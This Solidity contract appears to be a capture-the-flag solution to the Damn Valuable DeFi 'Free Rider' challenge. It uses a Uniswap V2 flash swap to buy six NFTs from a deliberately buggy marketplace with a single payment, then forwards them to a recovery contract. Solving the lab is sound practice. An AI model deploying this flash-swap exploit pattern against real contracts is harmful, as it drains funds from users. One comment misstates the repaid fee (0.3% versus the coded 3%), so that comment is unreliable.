//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "./FreeRiderNFTMarketplace.sol";
import "solmate/src/tokens/WETH.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRider is IUniswapV2Callee, IERC721Receiver {

    IUniswapV2Pair public immutable uPair;
    FreeRiderNFTMarketplace public immutable nftExchange;
    FreeRiderRecovery public immutable recovery;
    WETH public immutable wEth;
    DamnValuableNFT public immutable nft;

    address public immutable player;
    uint public constant NFT_PRICE = 15 ether;
    // dynamic array is a non-value type, non-value type cannot be constant/immutable at the moment
    uint[] public tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _uPair, address payable _nftExchange, address _recovery, address payable _wEth, address _nft, address _player) payable {
        uPair = IUniswapV2Pair(_uPair);
        nftExchange = FreeRiderNFTMarketplace(_nftExchange);
        player = _player;
        nft = DamnValuableNFT(_nft);
        wEth = WETH(_wEth);
        recovery = FreeRiderRecovery(_recovery);
    }

    function flashSwap() public {
        // flash swap from uniswap
        // a flash swap is similar to a flash loan, except that you can choose what tokens you want ( in the token pair )
        // you should reissue either the corresponding in one or other token at the end of the transaction
        bytes memory data = abi.encode(NFT_PRICE);
        // if you look in the js file, the first token of the pair is the WETH, which is what we need
        uPair.swap(NFT_PRICE, uint(0), address(this), data);
    }

    // once we get the money, we withdraw the ETH from the wETH token, buy all the tokens, and close the flash swap
    function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external {

        // Access control
        require(msg.sender == address(uPair));

        wEth.withdraw(amount0); // grab the eth from the wrapped ethereum
        // we can now buy all the tokens, due to the bug in the marketplace
        nftExchange.buyMany{value: amount0}(tokens);
        // repay the borrowed ETH, but there is a 0.3% fee
        uint amount0Adjusted = (amount0 * 103) / 100;
        wEth.deposit{value: amount0Adjusted}();
        wEth.transfer(msg.sender, amount0Adjusted);
    }

    function transferNft(uint id) public {
        bytes memory data = abi.encode(player);
        // the recovery need the address of the player to pay it once all tokens are recovered
        nft.safeTransferFrom(address(this), address(recovery), id ,data);
    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
